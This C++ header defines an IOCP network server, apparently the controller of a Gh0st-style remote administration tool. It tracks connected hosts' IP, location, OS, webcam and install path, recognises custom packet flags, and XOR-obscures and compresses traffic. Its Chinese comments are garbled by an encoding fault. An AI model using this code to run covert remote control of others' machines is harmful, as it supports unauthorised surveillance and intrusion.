#pragma once

#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#include "CpuUseage.h"
#include "Buffer.h"
#define XXH_INLINE_ALL
#include "xxhash.h"

#if USING_CTX
#include "zstd/zstd.h"
#endif

#include <Mstcpip.h>
#define PACKET_LENGTH   0x2000

#define FLAG_LENGTH   5
#define HDR_LENGTH   13

#define	NC_CLIENT_CONNECT		0x0001
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // ��������

std::string GetRemoteIP(SOCKET sock);


enum
{
	ONLINELIST_IP = 0,          // IP����˳��
	ONLINELIST_ADDR,            // ��ַ
	ONLINELIST_LOCATION,        // ����λ��
	ONLINELIST_COMPUTER_NAME,   // �������/��ע
	ONLINELIST_OS,              // ����ϵͳ
	ONLINELIST_CPU,             // CPU
	ONLINELIST_VIDEO,           // ����ͷ(����)
	ONLINELIST_PING,            // PING(�Է�������)
	ONLINELIST_VERSION,	        // �汾��Ϣ
	ONLINELIST_INSTALLTIME,     // ��װʱ��
	ONLINELIST_LOGINTIME,       // �����
	ONLINELIST_CLIENTTYPE,		// �ͻ�������
	ONLINELIST_PATH,			// �ļ�·��
	ONLINELIST_MAX,
};

// Encoder interface. The default encoder will do nothing.
class Encoder {
public:
	virtual ~Encoder(){}
	// Encode data before compress.
	virtual void Encode(unsigned char* data, int len) const{}
	// Decode data after uncompress.
	virtual void Decode(unsigned char* data, int len) const{}
};

// XOR Encoder implementation.
class XOREncoder : public Encoder {
private:
	std::vector<char> Keys;

public:
	XOREncoder(const std::vector<char>& keys = {0}) : Keys(keys){}

	virtual void Encode(unsigned char* data, int len) const {
		XOR(data, len, Keys);
	}

	virtual void Decode(unsigned char* data, int len) const {
		static std::vector<char> reversed(Keys.rbegin(), Keys.rend());
		XOR(data, len, reversed);
	}

protected:
	void XOR(unsigned char* data, int len, const std::vector<char> &keys) const {
		for (char key : keys) {
			for (int i = 0; i < len; ++i) {
				data[i] ^= key;
			}
		}
	}
};

enum {
	PARSER_FAILED = -1,			// ����ʧ��
	PARSER_NEEDMORE = 0,		// ��Ҫ��������
};

typedef struct PR {
	int Result;
	bool IsFailed() const {
		return PARSER_FAILED == Result;
	}
	bool IsNeedMore() const {
		return PARSER_NEEDMORE == Result;
	}
}PR;

enum {
	COMPRESS_UNKNOWN = -2,			// δ֪ѹ���㷨
	COMPRESS_ZLIB = -1,				// ��ǰ�汾ʹ�õ�ѹ������
	COMPRESS_ZSTD = 0,				// ��ǰʹ�õ�ѹ������
	COMPRESS_NONE = 1,				// û��ѹ��
};

struct CONTEXT_OBJECT;

// Header parser: parse the data to make sure it's from a supported client.
class HeaderParser {
	friend struct CONTEXT_OBJECT;
protected:
	HeaderParser() {
		memset(this, 0, sizeof(HeaderParser));
	}
	virtual ~HeaderParser() {
		Reset();
	}
	PR Parse(CBuffer& buf, int &compressMethod) {
		const int MinimumCount = 8;
		if (buf.GetBufferLength() < MinimumCount) {
			return PR{ PARSER_NEEDMORE };
		}
		char szPacketFlag[32] = { 0 };
		buf.CopyBuffer(szPacketFlag, MinimumCount, 0);
		if (m_bParsed) { // Check if the header has been parsed.
			return memcmp(m_szPacketFlag, szPacketFlag, m_nCompareLen) == 0 ? PR{ m_nFlagLen } : PR{ PARSER_FAILED };
		}
		// More version may be added in the future.
		const char version0[] = "Shine", version1[] = "<<FUCK>>", version2[] = "Hello?", version3[] = "HELL";
		if (memcmp(version0, szPacketFlag, sizeof(version0) - 1) == 0) {
			memcpy(m_szPacketFlag, version0, sizeof(version0) - 1);
			m_nCompareLen = strlen(m_szPacketFlag);
			m_nFlagLen = m_nCompareLen;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new Encoder();
		}
		else if (memcmp(version1, szPacketFlag, sizeof(version1) - 1) == 0) {
			memcpy(m_szPacketFlag, version1, sizeof(version1) - 1);
			m_nCompareLen = strlen(m_szPacketFlag);
			m_nFlagLen = m_nCompareLen + 3;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new XOREncoder();
		}
		else if (memcmp(version2, szPacketFlag, sizeof(version2) - 1) == 0) {
			memcpy(m_szPacketFlag, version2, sizeof(version2) - 1);
			m_nCompareLen = strlen(m_szPacketFlag);
			m_nFlagLen = 8;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			compressMethod = COMPRESS_NONE;
			m_Encoder = new Encoder();
		}
		else if (memcmp(version3, szPacketFlag, sizeof(version3) - 1) == 0) {
			memcpy(m_szPacketFlag, version3, sizeof(version3) - 1);
			m_nCompareLen = strlen(m_szPacketFlag);
			m_nFlagLen = 8;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new Encoder();
		}
		else {
			return PR{ PARSER_FAILED };
		}
		return PR{ m_nFlagLen };
	}
	HeaderParser& Reset() {
		SAFE_DELETE(m_Encoder);
		memset(this, 0, sizeof(HeaderParser));
		return *this;
	}
	BOOL IsParsed() const {
		return m_bParsed;
	}
	int GetFlagLen() const {
		return m_nFlagLen;
	}
	int GetHeaderLen() const {
		return m_nHeaderLen;
	}
	const char* GetFlag() const {
		return m_szPacketFlag;
	}
	Encoder* GetEncoder() const {
		return m_Encoder;
	}
private:
	BOOL				m_bParsed;					// ���ݰ��Ƿ���Խ���
	int					m_nHeaderLen;				// ���ݰ���ͷ����
	int					m_nCompareLen;				// �ȶ��ֽ���
	int					m_nFlagLen;					// ��ʶ����
	char				m_szPacketFlag[32];			// �Ա���Ϣ
	Encoder*			m_Encoder;					// ������
};

enum IOType 
{
	IOInitialize,
	IORead,
	IOWrite,   
	IOIdle
};

typedef struct CONTEXT_OBJECT 
{
	CString  sClientInfo[ONLINELIST_MAX];
	SOCKET   sClientSocket;
	WSABUF   wsaInBuf;
	WSABUF	 wsaOutBuffer;  
	char     szBuffer[PACKET_LENGTH];
	CBuffer				InCompressedBuffer;	        // ���յ���ѹ��������
	CBuffer				InDeCompressedBuffer;	    // ��ѹ�������
	CBuffer             OutCompressedBuffer;
	int				    v1;
	HANDLE              hDlg;
	void				*olps;						// OVERLAPPEDPLUS
	int					CompressMethod;				// ѹ���㷨
	HeaderParser		Parser;						// ��������Э��
	uint64_t			ID;							// Ψһ��ʶ

	BOOL				m_bProxyConnected;			// �����Ƿ�����
	BOOL 				bLogin;						// �Ƿ� login

	VOID InitMember()
	{
		memset(szBuffer, 0, sizeof(char) * PACKET_LENGTH);
		v1 = 0;
		hDlg = NULL;
		sClientSocket = INVALID_SOCKET;
		memset(&wsaInBuf, 0, sizeof(WSABUF));
		memset(&wsaOutBuffer, 0, sizeof(WSABUF));
		olps = NULL;
		for (int i = 0; i < ONLINELIST_MAX; i++) {
			sClientInfo[i].Empty();
		}
		CompressMethod = COMPRESS_ZSTD;
		Parser.Reset();
		bLogin = FALSE;
		m_bProxyConnected = FALSE;
	}
	VOID SetClientInfo(const CString(&s)[ONLINELIST_MAX]){
		for (int i = 0; i < ONLINELIST_MAX; i++)
		{
			sClientInfo[i] = s[i];
		}
	}
	CString GetClientData(int index) const{
		return sClientInfo[index];
	}
	// Write compressed buffer.
	void WriteBuffer(LPBYTE data, ULONG dataLen, ULONG originLen) {
		if (Parser.IsParsed()) {
			ULONG totalLen = dataLen + Parser.GetHeaderLen();
			OutCompressedBuffer.WriteBuffer((LPBYTE)Parser.GetFlag(), Parser.GetFlagLen());
			OutCompressedBuffer.WriteBuffer((PBYTE)&totalLen, sizeof(ULONG));
			OutCompressedBuffer.WriteBuffer((PBYTE)&originLen, sizeof(ULONG));
			OutCompressedBuffer.WriteBuffer(data, dataLen);
		}
	}
	// Read compressed buffer.
	PBYTE ReadBuffer(ULONG &dataLen, ULONG &originLen) {
		if (Parser.IsParsed()) {
			ULONG totalLen = 0;
			char szPacketFlag[32] = {};
			InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, Parser.GetFlagLen());
			InCompressedBuffer.ReadBuffer((PBYTE)&totalLen, sizeof(ULONG));
			InCompressedBuffer.ReadBuffer((PBYTE)&originLen, sizeof(ULONG));
			dataLen = totalLen - Parser.GetHeaderLen();
			PBYTE CompressedBuffer = new BYTE[dataLen];
			InCompressedBuffer.ReadBuffer(CompressedBuffer, dataLen);
			return CompressedBuffer;
		}
		return nullptr;
	}
	// Parse the data to make sure it's from a supported client. The length of `Header Flag` will be returned.
	PR Parse(CBuffer& buf) {
		return Parser.Parse(buf, CompressMethod);
	}
	// Encode data before compress.
	void Encode(PBYTE data, int len) const {
		Parser.GetEncoder()->Encode((unsigned char*)data, len);
	}
	// Decode data after uncompress.
	void Decode(PBYTE data, int len) const {
		Parser.GetEncoder()->Decode((unsigned char*)data, len);
	}
	std::string RemoteAddr() const {
		sockaddr_in  ClientAddr = {};
		int ulClientAddrLen = sizeof(sockaddr_in);
		int s = getpeername(sClientSocket, (SOCKADDR*)&ClientAddr, &ulClientAddrLen);
		return s != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";
	}
	static uint64_t CalculateID(const CString(&data)[ONLINELIST_MAX]) {
		int idx[] = { ONLINELIST_IP, ONLINELIST_COMPUTER_NAME, ONLINELIST_OS, ONLINELIST_CPU, ONLINELIST_PATH, };
		CString s;
		for (int i = 0; i < 5; i++) {
			s += data[idx[i]] + "|";
		}
		s.Delete(s.GetLength() - 1);
		return XXH64(s.GetString(), s.GetLength(), 0);
	}
	uint64_t GetID() const { return ID; }
	void SetID(uint64_t id) { ID = id; }
}CONTEXT_OBJECT,*PCONTEXT_OBJECT;

typedef CList<PCONTEXT_OBJECT> ContextObjectList;

class IOCPServer
{
public:
	SOCKET    m_sListenSocket;
	HANDLE    m_hCompletionPort;
	UINT      m_ulMaxConnections;          // ���������
	HANDLE    m_hListenEvent;
	HANDLE    m_hListenThread;
	BOOL      m_bTimeToKill;
	HANDLE    m_hKillEvent;

	ULONG m_ulThreadPoolMin;
	ULONG m_ulThreadPoolMax;
	ULONG m_ulCPULowThreadsHold; 
	ULONG m_ulCPUHighThreadsHold;
	ULONG m_ulCurrentThread;
	ULONG m_ulBusyThread;

#if USING_CTX
	ZSTD_CCtx* m_Cctx; // ѹ��������
	ZSTD_DCtx* m_Dctx; // ��ѹ������
#endif

	CCpuUsage m_cpu;

	ULONG  m_ulKeepLiveTime;

	typedef void (CALLBACK *pfnNotifyProc)(CONTEXT_OBJECT* ContextObject);
	typedef void (CALLBACK *pfnOfflineProc)(CONTEXT_OBJECT* ContextObject);
	UINT StartServer(pfnNotifyProc NotifyProc, pfnOfflineProc OffProc, USHORT uPort);

	static DWORD WINAPI ListenThreadProc(LPVOID lParam);
	BOOL InitializeIOCP(VOID);
	static DWORD WINAPI WorkThreadProc(LPVOID lParam);
	ULONG   m_ulWorkThreadCount;
	VOID OnAccept();
	CRITICAL_SECTION m_cs;

	/************************************************************************/
	//���±����Ķ���
	ContextObjectList				m_ContextConnectionList;
	ContextObjectList               m_ContextFreePoolList;
	PCONTEXT_OBJECT AllocateContext();
	VOID RemoveStaleContext(CONTEXT_OBJECT* ContextObject);
	VOID MoveContextToFreePoolList(CONTEXT_OBJECT* ContextObject);

	VOID PostRecv(CONTEXT_OBJECT* ContextObject);

	int AddWorkThread(int n) { 
		EnterCriticalSection(&m_cs); 
		m_ulWorkThreadCount += n;
		int ret = m_ulWorkThreadCount;
		LeaveCriticalSection(&m_cs);
		return ret;
	}

	/************************************************************************/
	//����õ����
	BOOL HandleIO(IOType PacketFlags,PCONTEXT_OBJECT ContextObject, DWORD dwTrans);
	BOOL OnClientInitializing(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans);
	BOOL OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD dwTrans);  
	VOID OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer , size_t ulOriginalLength);
	VOID Send(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) {
		OnClientPreSending(ContextObject, szBuffer, ulOriginalLength);
	}
	BOOL OnClientPostSending(CONTEXT_OBJECT* ContextObject,ULONG ulCompressedLength);
	void UpdateMaxConnection(int maxConn);
	IOCPServer(void);
	~IOCPServer(void);
	void Destroy();
	void Disconnect(CONTEXT_OBJECT *ctx){}
	pfnNotifyProc m_NotifyProc;
	pfnOfflineProc m_OfflineProc;
};

typedef IOCPServer ISocketBase;

#define TRACK_OVERLAPPEDPLUS 0

class OVERLAPPEDPLUS   
{
public:

	OVERLAPPED			m_ol;    
	IOType				m_ioType;

	OVERLAPPEDPLUS(IOType ioType)
	{
#if TRACK_OVERLAPPEDPLUS
		char szLog[100];
		sprintf_s(szLog, "=> [new] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
		Mprintf(szLog);
#endif
		ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
		m_ioType = ioType;
	}

	~OVERLAPPEDPLUS()
	{
#if TRACK_OVERLAPPEDPLUS
		char szLog[100];
		sprintf_s(szLog, "=> [delete] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
		Mprintf(szLog);
#endif
	}
};

typedef IOCPServer CIOCPServer;

typedef CONTEXT_OBJECT ClientContext;

#define m_Socket sClientSocket
#define m_DeCompressionBuffer InDeCompressedBuffer
